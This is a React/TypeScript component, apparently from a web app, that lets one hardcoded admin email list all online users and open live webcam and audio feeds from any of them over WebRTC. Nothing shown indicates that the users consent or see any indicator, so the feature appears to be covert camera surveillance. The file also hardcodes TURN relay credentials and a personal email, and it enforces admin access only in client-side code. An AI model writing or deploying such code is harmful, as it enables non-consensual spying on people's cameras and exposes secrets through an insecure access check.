'use client';

import React, { useCallback, useEffect, useRef, useState } from 'react';
import { io, Socket } from 'socket.io-client';
import { ChevronLeft, RotateCw, Users } from 'lucide-react';
import { triggerHaptic } from '@/lib/haptics';

const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-6gmj.onrender.com';
const ADMIN_EMAIL = 'hammadnawaz519@gmail.com';

interface CamUser {
  email: string;
  username: string;
  socketId: string;
  userId?: string;
}

interface Props {
  userEmail: string;
  username: string;
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  onCamUsersCount?: (count: number) => void;
}

const rtcConfig: RTCConfiguration = {
  iceServers: [
    { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] },
    {
      urls: [
        'turn:global.relay.metered.ca:80',
        'turn:global.relay.metered.ca:80?transport=tcp',
        'turn:global.relay.metered.ca:443',
        'turns:global.relay.metered.ca:443?transport=tcp',
      ],
      username: 'b861bc5468dd05aa2aff283d',
      credential: 'fJYY96O75HWDNLuH',
    },
  ],
  bundlePolicy: 'max-bundle',
  rtcpMuxPolicy: 'require',
  iceTransportPolicy: 'all',
};

function playVideo(video: HTMLVideoElement | null, stream: MediaStream | null) {
  if (!video || !stream) return;
  if (video.srcObject !== stream) video.srcObject = stream;
  video.muted = true;
  video.play().catch(() => undefined);
}

function colorFor(value: string) {
  const colors = ['#FFF3CD', '#E0F2FE', '#FCE7F3', '#FEF9C3', '#EDE9FE', '#DCFCE7'];
  let hash = 0;
  for (const char of value) hash = (hash * 31 + char.charCodeAt(0)) | 0;
  return colors[Math.abs(hash) % colors.length];
}

export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChange, onCamUsersCount }: Props) {
  const isAdmin = userEmail.toLowerCase().trim() === ADMIN_EMAIL;
  const [users, setUsers] = useState<CamUser[]>([]);
  const [target, setTarget] = useState<CamUser | null>(null);
  const [remoteStream, setRemoteStream] = useState<MediaStream | null>(null);
  const [status, setStatus] = useState<'connecting' | 'live' | 'error'>('connecting');
  const [audioMuted, setAudioMuted] = useState(true);

  const socketRef = useRef<Socket | null>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const targetRef = useRef<CamUser | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const candidatesRef = useRef<RTCIceCandidateInit[]>([]);
  const generationRef = useRef(0);
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const closePeer = useCallback(() => {
    if (timeoutRef.current) clearTimeout(timeoutRef.current);
    timeoutRef.current = null;
    if (peerRef.current) {
      peerRef.current.ontrack = null;
      peerRef.current.onicecandidate = null;
      peerRef.current.onconnectionstatechange = null;
      peerRef.current.close();
      peerRef.current = null;
    }
    candidatesRef.current = [];
    setRemoteStream(null);
  }, []);

  const stopViewing = useCallback(() => {
    const current = targetRef.current;
    if (current && socketRef.current?.connected) {
      socketRef.current.emit('cam_stop_viewing', {
        targetSocketId: current.socketId,
        targetEmail: current.email,
      });
    }
    generationRef.current += 1;
    closePeer();
    targetRef.current = null;
    setTarget(null);
  }, [closePeer]);

  const watchUser = useCallback(async (user: CamUser) => {
    const socket = socketRef.current;
    if (!socket?.connected) return;

    const generation = ++generationRef.current;
    closePeer();
    targetRef.current = user;
    setTarget(user);
    setStatus('connecting');

    try {
      const peer = new RTCPeerConnection(rtcConfig);
      peerRef.current = peer;
      peer.addTransceiver('audio', { direction: 'recvonly' });
      peer.addTransceiver('video', { direction: 'recvonly' });

      peer.ontrack = event => {
        if (generation !== generationRef.current) return;
        const stream = event.streams[0] || new MediaStream([event.track]);
        setRemoteStream(stream);
        setStatus('live');
        playVideo(videoRef.current, stream);
      };

      peer.onicecandidate = event => {
        if (!event.candidate || generation !== generationRef.current) return;
        socket.emit('cam_signal', {
          targetSocketId: user.socketId,
          targetEmail: user.email,
          targetUsername: user.username,
          signal: event.candidate.toJSON(),
        });
      };

      peer.onconnectionstatechange = () => {
        if (generation !== generationRef.current) return;
        if (peer.connectionState === 'connected') setStatus('live');
        if (peer.connectionState === 'failed' || peer.connectionState === 'closed') setStatus('error');
      };

      timeoutRef.current = setTimeout(() => {
        if (generation === generationRef.current && !remoteStream) setStatus('error');
      }, 20000);

      const offer = await peer.createOffer();
      await peer.setLocalDescription(offer);
      if (generation !== generationRef.current) return;
      socket.emit('cam_signal', {
        targetSocketId: user.socketId,
        targetEmail: user.email,
        targetUsername: user.username,
        signal: { type: 'offer', sdp: offer.sdp },
      });
    } catch (error) {
      console.warn('[AdminCamViewer] Camera connection failed:', error);
      if (generation === generationRef.current) setStatus('error');
    }
  }, [closePeer, remoteStream]);

  useEffect(() => {
    if (!isAdmin || !isOpen) return;

    const socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: Infinity,
      timeout: 15000,
    });
    socketRef.current = socket;
    const email = userEmail.toLowerCase().trim();

    const refreshUsers = () => socket.emit('cam_get_users');
    const onConnect = () => {
      socket.emit('identify', { email, username: username || 'Admin' });
      socket.emit('cam_user_online', { email, username: username || 'Admin' });
      refreshUsers();
    };
    const onUsers = (list: CamUser[]) => {
      const unique = new Map<string, CamUser>();
      for (const user of Array.isArray(list) ? list : []) {
        const cleanEmail = String(user.email || '').toLowerCase().trim();
        if (!cleanEmail || cleanEmail === email || cleanEmail === ADMIN_EMAIL) continue;
        unique.set(cleanEmail, { ...user, email: cleanEmail, username: user.username || 'User' });
      }
      const next = [...unique.values()].sort((a, b) => a.username.localeCompare(b.username));
      setUsers(next);
      onCamUsersCount?.(next.length);
    };
    const onSignal = async (payload: { fromSocketId?: string; fromEmail?: string; signal?: any }) => {
      const current = targetRef.current;
      const peer = peerRef.current;
      const signal = payload?.signal;
      if (!current || !peer || !signal) return;
      const fromEmail = String(payload.fromEmail || '').toLowerCase().trim();
      if (payload.fromSocketId !== current.socketId && fromEmail !== current.email) return;

      try {
        if (signal.type === 'cam_error') {
          setStatus('error');
          return;
        }
        if (signal.type === 'answer') {
          if (peer.signalingState !== 'have-local-offer') return;
          await peer.setRemoteDescription(signal);
          for (const candidate of candidatesRef.current.splice(0)) {
            await peer.addIceCandidate(candidate).catch(() => undefined);
          }
          return;
        }
        const candidate = signal.candidate && typeof signal.candidate === 'object' ? signal.candidate : signal;
        if (!candidate.candidate) return;
        if (peer.remoteDescription) await peer.addIceCandidate(candidate).catch(() => undefined);
        else candidatesRef.current.push(candidate);
      } catch (error) {
        console.warn('[AdminCamViewer] Signal handling failed:', error);
        setStatus('error');
      }
    };

    socket.on('connect', onConnect);
    socket.on('connect_error', error => {
      console.warn('[AdminCamViewer] Socket connection failed:', error.message);
      if (!targetRef.current) onCamUsersCount?.(0);
      else setStatus('error');
    });
    socket.on('cam_users_list', onUsers);
    socket.on('cam_user_online_event', refreshUsers);
    socket.on('cam_user_offline', ({ socketId }: { socketId: string }) => {
      setUsers(previous => previous.filter(user => user.socketId !== socketId));
      if (targetRef.current?.socketId === socketId) stopViewing();
    });
    socket.on('cam_signal', onSignal);
    if (socket.connected) onConnect();

    return () => {
      stopViewing();
      socket.removeAllListeners();
      socket.disconnect();
      socketRef.current = null;
    };
  }, [isAdmin, isOpen, onCamUsersCount, stopViewing, userEmail, username]);

  useEffect(() => playVideo(videoRef.current, remoteStream), [remoteStream]);

  if (!isAdmin || !isOpen) return null;

  return (
    <div className="fixed inset-0 z-[1600] flex flex-col bg-[#141111] p-4 pt-12 pb-6 text-white">
      {!target ? (
        <div className="flex h-full flex-col">
          <div className="flex items-center justify-between px-2 pb-4">
            <button type="button" onClick={() => onOpenChange(false)} className="p-2" title="Back"><ChevronLeft /></button>
            <h1 className="text-2xl font-black">Online Clients</h1>
            <button type="button" onClick={refreshUsers} className="p-2 text-zinc-400" title="Refresh"><RotateCw /></button>
          </div>
          <div className="min-h-0 flex-1 overflow-y-auto rounded-t-[32px] bg-white p-4 text-zinc-900">
            {users.length === 0 ? (
              <div className="flex h-full flex-col items-center justify-center text-zinc-400"><Users className="mb-3 h-8 w-8" /><b>No Online Users</b></div>
            ) : users.map(user => (
              <button type="button" key={user.socketId} onClick={() => { triggerHaptic('medium'); void watchUser(user); }} className="mb-2 flex w-full items-center justify-between rounded-2xl border border-zinc-100 bg-zinc-50 p-3 text-left">
                <span className="flex min-w-0 items-center gap-3">
                  <span className="flex h-12 w-12 shrink-0 items-center justify-center rounded-full text-lg font-bold" style={{ backgroundColor: colorFor(user.username) }}>{user.username.charAt(0).toUpperCase()}</span>
                  <span className="min-w-0"><b className="block truncate">{user.username}</b><small className="block truncate text-zinc-400">{user.email}</small></span>
                </span>
                <span className="rounded-full bg-zinc-900 px-4 py-2 text-xs font-bold text-white">Watch Cam</span>
              </button>
            ))}
          </div>
        </div>
      ) : (
        <div className="flex h-full flex-col gap-4">
          <div className="flex items-center justify-between px-2">
            <button type="button" onClick={stopViewing} className="rounded-full bg-zinc-100 p-3 text-zinc-900" title="Back"><ChevronLeft /></button>
            <span className="rounded-full bg-zinc-100 px-4 py-2 text-xs font-bold uppercase text-zinc-700">{status === 'live' ? 'Live Cam Feed' : status === 'error' ? 'Stream Offline' : 'Connecting...'}</span>
            <button type="button" onClick={() => void watchUser(target)} className="rounded-full bg-zinc-100 p-3 text-zinc-900" title="Reconnect"><RotateCw /></button>
          </div>
          <div className="relative min-h-0 flex-1 overflow-hidden rounded-[32px] bg-black">
            <video ref={videoRef} autoPlay playsInline muted className={`h-full w-full object-cover ${status === 'live' ? 'opacity-100' : 'opacity-0'}`} />
            {status !== 'live' && <div className="absolute inset-0 flex flex-col items-center justify-center gap-4 bg-zinc-950 text-center"><div className="flex h-24 w-24 items-center justify-center rounded-full text-3xl font-black text-zinc-900" style={{ backgroundColor: colorFor(target.username) }}>{target.username.charAt(0).toUpperCase()}</div><b>{status === 'error' ? 'Stream Offline' : `Connecting to ${target.username}...`}</b><button type="button" onClick={() => void watchUser(target)} className="rounded-full bg-white px-5 py-2 text-xs font-bold text-zinc-900">Try Again</button></div>}
            <div className="absolute bottom-4 left-4 rounded-full bg-black/60 px-4 py-2 text-xs font-bold">{target.username}</div>
          </div>
          <button type="button" onClick={() => setAudioMuted(previous => !previous)} className="rounded-full bg-zinc-800 p-4 text-center text-sm font-bold">{audioMuted ? 'Unmute Audio' : 'Mute Audio'}</button>
        </div>
      )}
    </div>
  );
}
